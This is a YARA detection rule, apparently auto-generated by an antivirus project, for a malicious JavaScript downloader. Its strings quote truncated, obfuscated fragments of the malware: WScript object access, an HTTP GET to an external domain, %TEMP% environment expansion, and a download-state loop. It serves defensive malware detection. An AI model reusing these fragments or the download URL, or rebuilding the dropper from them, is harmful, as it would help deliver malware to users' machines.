rule sig_20160428_4f35248030632fd4e8d1f689917d845e {
  meta:
    description = "datamaliciousorder - file 20160428_4f35248030632fd4e8d1f689917d845e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "eabf0c79bf63667d35be80549c4c908bc592ad8635265ed538e914f199bfce68"

  strings:
    $s1  = "RwdAloYmnQjbTcsTvrYvn[WivHosHqrBsdBflXqvSxw](\"G\" + \"ET\", \"http://xn--12ct7bab7ccc0ga4bik3a2b1koa4km8d.com/zmd7jf\", false);" ascii
    $s2  = "function DbwNytIrgXdiDisWzdYhy(XiySheLdyYlnTvrPkgNlw){MulGjtXjnXkcGdnOmmGgb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function DbwNytIrgXdiDisWzdYhy(XiySheLdyYlnTvrPkgNlw){MulGjtXjnXkcGdnOmmGgb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function KsuPdmGblNicZukRobIea() {return MulGjtXjnXkcGdnOmmGgb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "function IiiJfnHjqSnuDqwYvdKzl(PtaJtbLizDleBehZerKpg, KeqOfdKeiFoaVapGmfVdn){WjbCigZyoYazMjrBlvPby = WjbCigZyoYazMjrBlvPby * 1; " ascii
    $s6  = "return PtaJtbLizDleBehZerKpg - KeqOfdKeiFoaVapGmfVdn;};" fullword ascii
    $s7  = "var MulGjtXjnXkcGdnOmmGgb = function BfkGwgKooWkiZmnMstVkf() {return QxwZinMnwSclHzoUqbYzb[IxpSdbQsbPiiRuxEvbLtz](\"WScript\"+\"" ascii
    $s8  = "var QxwZinMnwSclHzoUqbYzb = this[\"WScript\"];" fullword ascii
    $s9  = "var MulGjtXjnXkcGdnOmmGgb = function BfkGwgKooWkiZmnMstVkf() {return QxwZinMnwSclHzoUqbYzb[IxpSdbQsbPiiRuxEvbLtz](\"WScript\"+\"" ascii
    $s10 = "function KsuPdmGblNicZukRobIea() {return MulGjtXjnXkcGdnOmmGgb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function IiiJfnHjqSnuDqwYvdKzl(PtaJtbLizDleBehZerKpg, KeqOfdKeiFoaVapGmfVdn){WjbCigZyoYazMjrBlvPby = WjbCigZyoYazMjrBlvPby * 1; " ascii
    $s12 = "if (RwdAloYmnQjbTcsTvrYvn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function HbaNtnTspNiuFcjTkrQej(){return TcbImzWvlUhxRhyIqbTbk + \"\";};" fullword ascii
    $s14 = "function OpjCgiUihOfnZhfYoyUhb() {return ((DfhJxtEhoSgbQitNmbYna == true) && (DfhJxtEhoSgbQitNmbYna == YanArxZzyVmuYgsNcnMtu)) ?" ascii
    $s15 = "function OpjCgiUihOfnZhfYoyUhb() {return ((DfhJxtEhoSgbQitNmbYna == true) && (DfhJxtEhoSgbQitNmbYna == YanArxZzyVmuYgsNcnMtu)) ?" ascii
    $s16 = "var DfhJxtEhoSgbQitNmbYna = false;" fullword ascii
    $s17 = "DfhJxtEhoSgbQitNmbYna = true; " fullword ascii
    $s18 = "function FrvXxdLawLmiXjhYdwGvi()" fullword ascii
    $s19 = "function AvfYsaGxzGtbJwdNkrUau(JswPaqCdoOfcPmeTxxTzr) {var BnmLdbBfhIppIooQhzWnx = (1, 2, 3, 4, 5, JswPaqCdoOfcPmeTxxTzr); retur" ascii
    $s20 = "function LrmXdyOnbOpoMbiZfwVlz(){return IxpSdbQsbPiiRuxEvbLtz;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}